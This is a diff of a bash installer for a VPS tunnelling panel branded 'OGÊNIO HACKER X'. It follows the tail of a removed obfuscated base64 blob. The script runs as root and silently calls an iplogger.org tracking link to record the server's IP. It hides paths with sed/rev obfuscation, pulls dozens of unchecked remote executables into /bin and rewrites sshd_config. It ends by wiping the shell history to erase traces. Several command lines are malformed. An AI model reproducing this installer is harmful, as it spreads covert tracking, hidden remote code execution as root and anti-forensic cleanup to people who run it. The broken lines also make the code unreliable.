bQvZ5AuwPgXY4qnCBqT/0hnxi7C5oGnc6eT5XJBkt6M3skF7sJGFOpy0im3tCZOxE8vlTSVsuqokQstXEmgaqcXOIvu5tQYRyrnhEpMMTlqcYMgzPqasVkmaBy8ZkE4+C6HpcsLwKxEVXVeaHRMc+Na4RvnkpB3toq7pnWhbd/rSojXWvuvVwGZ1M6F4IXloF+wNqsSMULtFkOsfGylWZiAaUBEI/7caaQ3/IxJm6xnjjd+BTqEj+u38Urue6oA593mofAoQxcnYNhiK5n0PMIqj63pglAfme8BkZPEOnVCRvxUOoJtDmuwDBvTd0Y5AFMs+PFDkFN/NagPjG6Y9wLmB5nwhoC7eCUKUZu0B0Ktq54glkNXiBHa3eg0KJz5res+QZfftBMrft53yEmMnQ2u6l+3+vgRIUdYOWz+dUf6eRClGTkXaCdSeZUUD1S4OR6hHYrCP/DSH8sRQFzLz4Ul/AVomhaDfJeR9CvtDc/vDaSMJ1GJfjC2S+9iPObaiG/tFY3vZlrerSl5hoJrcBpBs0vAkS76g7quNqDKzOQhIqxrSDwDyd0qPPUUml6Vkct4UvBH34qJBNyTVaYWJO3XuSBdg1UHjK0KTzG67OWnoRyHVePInRVy+ILJE7UZ4LF/V+HMaq+9zPKb0i70vPT9geF3UCnU7qe0TARs9qiypvqYqrU0frKx5s5ecoiW34xQvhIX0EbBhHDFsERMhvIE6v5LN5TaMDOpRqrJg0bsFlOHMNoNJ/pzHvNxzIaKeOxERSNFv/VwHUpKq/RUhwwkXRp4Gb3ydYFkh/3gJUNdDj9FXQNFf7vBvYPkawAPvAkkf3OabPdfdG9QnHhIzdcpj60/WHj023vB7TLFHVDN4Stba7HeUuMZtK/u0BHSnlfmxhv7/K3NIx3eHkoTpSlFhdKg15QfNTUbNAvmZsTmNLd8LT37KUJHgNBJxR76ARVG6IrOQOosNsSpcGIzh5dJPX5EutmnBt7D8vZh/I4sXxwENi5+Xw8biK7IWqzfNXg/59aFUNwSqce/88YVMDA0WmXEGbPHMIudeMA/BX2RPpa/NRhNoxVDzNOH69e3V5S26ur5+9ebny9UDg2hQDl2Fp2U/X1qWSsVS/g3iYzTXz6PUmwn/Aw==')))));
-?>
+echo -e "\033[1;34mSE ENVIO MENSAJE DE PRUEBA SI NO LLEGA CONTACTE A @Kalix1 "
+}
+fun_ip
+wget -O /usr/bin/trans https://raw.githubusercontent.com/AAAAAEXQOSyIpN2JZ0ehUQ/PROYECTOS_DESCONTINUADOS/master/GENERADOR-VPS-MX/Install/trans &> /dev/null
+wget -O /bin/Desbloqueo.sh https://raw.githubusercontent.com/VPS-MX/VPS-MX-8.0/master/ArchivosUtilitarios/Desbloqueo.sh &> /dev/null
+chmod +x /bin/Desbloqueo.sh
+wget -O /bin/monitor.sh https://raw.githubusercontent.com/VPS-MX/VPS-MX-8.0/master/ArchivosUtilitarios/Monitor-Service/monitor.sh &> /dev/null
+chmod +x /bin/monitor.sh
+wget -O /var/www/html/estilos.css https://raw.githubusercontent.com/VPS-MX/VPS-MX-8.0/master/ArchivosUtilitarios/Monitor-Service/estilos.css &> /dev/null
+msg -bar2
+echo -e "\033[01;34m▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣"
+msg -ama "     [ OGÊNIO HACKER X \033[1;97m ❌ @ogeniohacker ❌\033[1;33m ]"
+msg -ama "  \033[1;96m      🔰Usar Ubuntu 18 a 64 De Preferencia🔰 "
+echo -e "\033[01;34m▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣"
+[[ $1 = "" ]] && funcao_idioma || {
+[[ ${#1} -gt 2 ]] && funcao_idioma || id="$1"
+ }
+error_fun () {
+msg -bar2 && msg -verm "ERROR de enlace VPS<-->GENERADOR" && msg -bar2
+[[ -d ${SCPinstal} ]] && rm -rf ${SCPinstal}
+rm -rf lista-arq
+exit 1
+}
+invalid_key () {
+msg -bar2 && msg -verm "#¡Key Invalida#! " && msg -bar2
+[[ -e $HOME/lista-arq ]] && rm $HOME/lista-arq
+exit 1
+}
+while [[ ! $Key ]]; do
+msg -bar2 && msg -ne "# DIGITE SUA KEY #: " && read Key
+tput cuu1 && tput dl1
+done
+msg -ne "# Verificando Key # : "
+cd $HOME
+wget -O $HOME/lista-arq $(ofus "$Key")/$IP > /dev/null 2>&1 && echo -e "\033[1;32m Key Completa" || {
+   echo -e "\033[1;91m Key Incompleta"
+   invalid_key
+   exit
+   }
+IP=$(ofus "$Key" | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}') && echo "$IP" > /usr/bin/vendor_code
+sleep 1s
+function_verify
+[[ "$(whoami)" != "root" ]] && {
+echo -e "\033[1;33m[\033[1;31mErro\033[1;33m] \033[1;37m- \033[1;33mvocê precisa executar como root\033[0m"
+rm $HOME/Plus > /dev/null 2>&1; exit 0
+}
+_lnk=$(echo 'z1:y#x.5s0ul&p4hs$s.0a72d*n-e!v89e032:3r'| sed -e 's/[^a-z.]//ig'| rev); _Ink=$(echo '/3×u3#s87r/l32o4×c1a×l1/83×l24×i0b×'|sed -e 's/[^a-z/]//ig'); _1nk=$(echo '/3×u3#s×87r/83×l2×4×i0b×'|sed -e 's/[^a-z/]//ig')
+cd $HOME
+fun_bar () {
+comando[0]="$1"
+comando[1]="$2"
+(
+[[ -e $HOME/fim ]] && rm $HOME/fim
+${comando[0]} -y > /dev/null 2>&1
+${comando[1]} -y > /dev/null 2>&1
+touch $HOME/fim
+) > /dev/null 2>&1 &
+tput civis
+echo -ne "  \033[1;33mAGUARDE \033[1;37m- \033[1;33m["
+while true; do
+for((i=0; i<18; i++)); do
+echo -ne "\033[1;31m#"
+sleep 0.1s
+done
+[[ -e $HOME/fim ]] && rm $HOME/fim && break
+echo -e "\033[1;33m]"
+sleep 1s
+tput cuu1
+tput dl1
+echo -ne "  \033[1;33mAGUARDE \033[1;37m- \033[1;33m["
+done
+echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
+tput cnorm
+}
+function verif_key () {
+krm=$(echo '5:q-3gs2.o7%8:1'|rev); chmod +x $_Ink/list > /dev/null 2>&1
+[[ ! -e "$_Ink/list" ]] && {
+echo -e "\n\033[1;31mKEY INVÁLIDA!\033[0m"
+rm -rf $HOME/Plus > /dev/null 2>&1
+sleep 2
+clear; exit 1
+}
+}
+echo ""
+echo -e "\033[01;31m▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣\033[0m"
+tput setaf 7 ; tput setab 4 ; tput bold ; printf '%55s%s%-12s\n' "OGÊNIO HACKER X @OOGENIOHACKER" ; tput sgr0
+echo -e "\033[01;31m▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣\033[0m"
+echo ""
+echo ""
+echo -e "                       \033[05;31mSISTEMAS \033[05;33mOPERACIONAIS\033[0m"
+echo ""
+echo -e "\033[1;31m• \033[1;33mUBUNTU 18 x64\033[0m"
+echo -e "\033[1;31m• \033[1;33mUBUNTU 20 x64\033[0m"
+echo -e "\033[1;31m• \033[1;33mDEBIAN 9 x64\033[0m"
+echo -e "\033[1;31m• \033[1;33mDEBIAN 10 x64\033[0m"
+echo -e "\033[1;31m• \033[1;33mDEBIAN 11 x64\033[0m"
+echo -e "\033[1;31m \033[1;33m\033[0m"
+echo -e "\033[1;31m• \033[1;33mUSE UBUNTU 18 x64 PARA UMA MELHOR EXPERIÊNCIA\033[0m"
+echo -e "\033[1;31m• \033[1;33mUSE UBUNTU 18 x64 PARA (V2RAY) EVITEM OUTROS SISTEMAS\033[0m"
+echo -e "\033[1;31m \033[1;33m\033[0m"
+echo ""
+echo -e "\033[1;31m▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣033[0m"
+echo ""
+#-----------------------------------------------------------------------------------------------------------------
+echo -ne "\033[1;36mDIGITE (s) PRA CONTINUAR (n) SAIR\033[1;37m"; read x
+[[ $x = @(n|N) ]] && exit
+sed -i 's/Port 22222/Port 22/g' /etc/ssh/sshd_config  > /dev/null 2>&1
+service ssh restart  > /dev/null 2>&1
+echo -e "\n\033[1;36mVERIFICANDO... \033[1;37m \033[0m" ; rm $_Ink/list > /dev/null 2>&1; wget -P $_Ink get https://raw.githubusercontent.com/REDHAWKOG/OGENIO/master/Install/list > /dev/null 2>&1; verif_key
+echo "/bin/menu" > /bin/h && chmod +x /bin/h > /dev/null 2>&1
+rm versao* > /dev/null 2>&1
+wget https://raw.githubusercontent.com/REDHAWKOG/OGENIO/master/Install/versao > /dev/null 2>&1
+> /dev/null 2>&1
+wget https://iplogger.org/2lHZ43 > /dev/null 2>&1
+> /dev/null 2>&1
+rm 2lHZ43 > /dev/null 2>&1
+cd /bin/ > /dev/null 2>&1
+rm v2raymanager > /dev/null 2>&1
+wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/v2raymanager > /dev/null 2>&1
+chmod 777 v2raymanager > /dev/null 2>&1
+chmod 777 menu > /dev/null 2>&1
+echo ""
+[[ -f "$HOME/usuarios.db" ]] && {
+clear
+echo -e "\n\033[0;34m▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣\033[0m"
+echo ""
+echo -e "                 \033[1;33m• \033[1;31mATENCAO \033[1;33m• \033[0m"
+echo ""
+echo -e "\033[1;33mUma base de Dados de Usuários \033[1;32m(usuarios.db) \033[1;33mFoi"
+echo -e "Encontrada! Deseja mantê-la preservando o limite"
+echo -e "de Conexões simutaneas dos usuários ? Ou Deseja"
+echo -e "criar uma nova base de dados ?\033[0m"
+echo -e "\n\033[1;37m[\033[1;31m1\033[1;37m] \033[1;33mManter Base de Dados Atual\033[0m"
+echo -e "\033[1;37m[\033[1;31m2\033[1;37m] \033[1;33mCriar uma Nova Base de Dados\033[0m"
+echo -e "\n\033[0;34m▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣\033[0m"
+echo ""
+tput setaf 2 ; tput bold ; read -p "Opção ?: " -e -i 1 optiondb ; tput sgr0
+} || {
+awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
+}
+[[ "$optiondb" = '2' ]] && awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
+clear
+tput setaf 7 ; tput setab 4 ; tput bold ; printf '%35s%s%-18s\n' " AGUARDE A INSTALAÇÃO" ; tput sgr0
+echo ""
+echo ""
+echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32mATUALIZANDO SISTEMA \033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
+echo ""
+echo -e "    \033[1;33mATUALIZAÇÕES COSTUMA DEMORAR UM POUCO!\033[0m"
+echo ""
+fun_attlist () {
+apt-get update -y
+[[ ! -d /usr/share/.plus ]] && mkdir /usr/share/.plus
+echo "crz: $(date)" > /usr/share/.plus/.plus
+}
+fun_bar 'fun_attlist'
+clear
+echo ""
+echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32mINSTALANDO PACOTES \033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
+echo ""
+echo -e "\033[1;33mALGUNS PACOTES SAO EXTREMAMENTE  NECESSÁRIOS !\033[0m"
+echo ""
+inst_pct () {
+_pacotes=("bc" "screen" "nano" "unzip" "lsof" "netstat" "net-tools" "dos2unix" "nload" "jq" "curl" "figlet" "python3" "python-pip")
+for _prog in ${_pacotes[@]}; do
+apt install $_prog -y
+git clone https://github.com/REDHAWKOG/bashtop
+cd /bin/ && rm -f blocksite*
+cd /bin/ && rm -f shutdown -r 00:00*
+cd /bin/ && rm -f websocket.sh*
+cd /bin/ && rm -f multi.sh*
+cd /bin/ && rm -f swapmemory*
+cd /bin/ && rm -f tweaker*
+cd /bin/ && rm -f webmin.sh*
+cd /bin/ && rm -f prnet.sh*
+cd /bin/ && rm -f dns-netflix.sh*
+cd /bin/ && rm -f blockuser*
+cd /bin/ && rm -f multi*
+cd /bin/ && rm -f v2ray clean*
+cd /bin/ && rm -f botpro*
+cd /bin/ && rm -f Autobackup*
+cd /bin/ && rm -f backup_mail.sh*
+cd /bin/ && rm -f celular.sh*
+cd /bin/ && rm -f badpro1*
+cd /bin/ && rm -f painelv2ray*
+cd /bin/ && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/v2ray clean > /dev/null 2>&1
+cd /bin/ && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/multi > /dev/null 2>&1
+cd /bin/ && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/blocksite > /dev/null 2>&1
+cd /bin/ && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/websocket.sh > /dev/null 2>&1
+cd /bin/ && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/shutdown -r 16:00 > /dev/null 2>&1
+cd /bin/ && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/multi.sh > /dev/null 2>&1
+cd /bin/ && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/swapmemory > /dev/null 2>&1
+cd /bin/ && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/tweaker > /dev/null 2>&1
+cd /bin/ && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/webmin.sh > /dev/null 2>&1
+cd /bin/ && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/prnet.sh > /dev/null 2>&1
+cd /bin/ && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/dns-netflix.sh > /dev/null 2>&1
+cd /bin/ && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/blockuser > /dev/null 2>&1
+cd /bin/ && wget https://github.com/ogenio/SSHPLUS/raw/master/Sistema/script/botpro > /dev/null 2>&1
+cd /bin/ && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/Autobackup > /dev/null 2>&1
+cd /bin/ && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/backup_mail.sh > /dev/null 2>&1
+cd /bin/ && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/celular.sh > /dev/null 2>&1
+cd /bin/ && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/badpro1 > /dev/null 2>&1
+cd /bin/ && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/painelv2ray > /dev/null 2>&1
+cd /bin/ && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/badpro > /dev/null 2>&1
+cd /bin/ && chmod +x blocksite
+cd /bin/ && chmod +x multi
+cd /bin/ && chmod +x swapmemory
+cd /bin/ && chmod +x shutdown -r 00:00
+cd /bin/ && chmod +x websocket.sh
+cd /bin/ && chmod +x tweaker
+cd /bin/ && chmod +x webmin.sh
+cd /bin/ && chmod +x prnet.sh
+cd /bin/ && chmod +x dns-netflix.sh
+cd /bin/ && chmod +x blockuser
+cd /bin/ && chmod +x v2ray clean
+cd /bin/ && chmod +x botpro
+cd /bin/ && chmod +x Autobackup
+cd /bin/ && chmod +x backup_mail.sh
+cd /bin/ && chmod +x celular.sh
+cd /bin/ && chmod +x badpro1
+cd /bin/ && chmod +x painelv2ray
+cd /bin/ && rm -f dns-server*
+cd /bin/ && rm -f remove-slow*
+cd /bin/ && rm -f restartdns*
+cd /bin/ && rm -f slowdns-drop*
+cd /bin/ && rm -f slowdns-info*
+cd /bin/ && rm -f slowdns-socks*
+cd /bin/ && rm -f slowdns-ssh*
+cd /bin/ && rm -f slowdns-ssl*
+cd /bin/ && rm -f startdns*
+cd /bin/ && rm -f stopdns*
+rm -rf /bin/slowdns*
+mkdir /bin/slowdns*
+rm -f /bin/slowdns*
+cd /bin/ && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/slowdns > /dev/null 2>&1
+cd /bin/slowdns && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/dns-server > /dev/null  2>&1
+cd /bin/slowdns && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/remove-slow > /dev/null 2>&1
+cd /bin/slowdns && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/restartdns > /dev/null 2>&1
+cd /bin/slowdns && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/slowdns-drop > /dev/null 2>&1
+cd /bin/slowdns && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/slowdns-info > /dev/null 2>&1
+cd /bin/slowdns && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/slowdns-socks > /dev/null 2>&1
+cd /bin/slowdns && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/slowdns-ssh > /dev/null 2>&1
+cd /bin/slowdns && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/slowdns-ssl > /dev/null 2>&1
+cd /bin/slowdns && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/startdns > /dev/null 2>&1
+cd /bin/slowdns && wget https://github.com/REDHAWKOG/OGENIO/raw/master/Modulos/stopdns > /dev/null 2>&1
+cd /bin/ && chmod +x slowdns
+cd /bin/slowdns && chmod +x dns-server
+cd /bin/slowdns && chmod +x remove-slow
+cd /bin/slowdns && chmod +x restartdns
+cd /bin/slowdns && chmod +x slowdns-drop
+cd /bin/slowdns && chmod +x slowdns-info
+cd /bin/slowdns && chmod +x slowdns-socks
+cd /bin/slowdns && chmod +x slowdns-ssh
+cd /bin/slowdns && chmod +x slowdns-ssl
+cd /bin/slowdns && chmod +x startdns
+cd /bin/slowdns && chmod +x stopdns
+cd > /dev/null 2>&1
+done
+pip install speedtest-cli
+}
+fun_bar 'inst_pct'
+[[ -f "/usr/sbin/ufw" ]] && ufw allow 443/tcp ; ufw allow 80/tcp ; ufw allow 3128/tcp ; ufw allow 8799/tcp ; ufw allow 8080/tcp
+clear
+echo ""
+echo -e "              \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32mFINALIZANDO \033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
+echo ""
+echo -e "      \033[1;33mCONCLUINDO FUNÇÕES E DEFINIÇÕES! \033[0m"
+echo ""
+fun_bar "$_Ink/list $_lnk $_Ink $_1nk $key"
+echo ""
+cd $HOME
+echo -e "        \033[1;33m • \033[1;32mINSTALACAO CONCLUIDA\033[1;33m • \033[0m"
+echo ""
+echo -e "   GENIO HACKER X" | figlet
+echo -e "\033[1;31m \033[1;33mPARA INICIAR DIGITE: \033[1;32mmenu\033[0m"
+echo -e "\033[1;33m MAIS INFORMACOES \033[1;31m(\033[1;36mTELEGRAM\033[1;31m): \033[1;37m@OOGENIOHACKER\033[0m"
+rm $HOME/Plus && cat /dev/null > ~/.bash_history && history -c
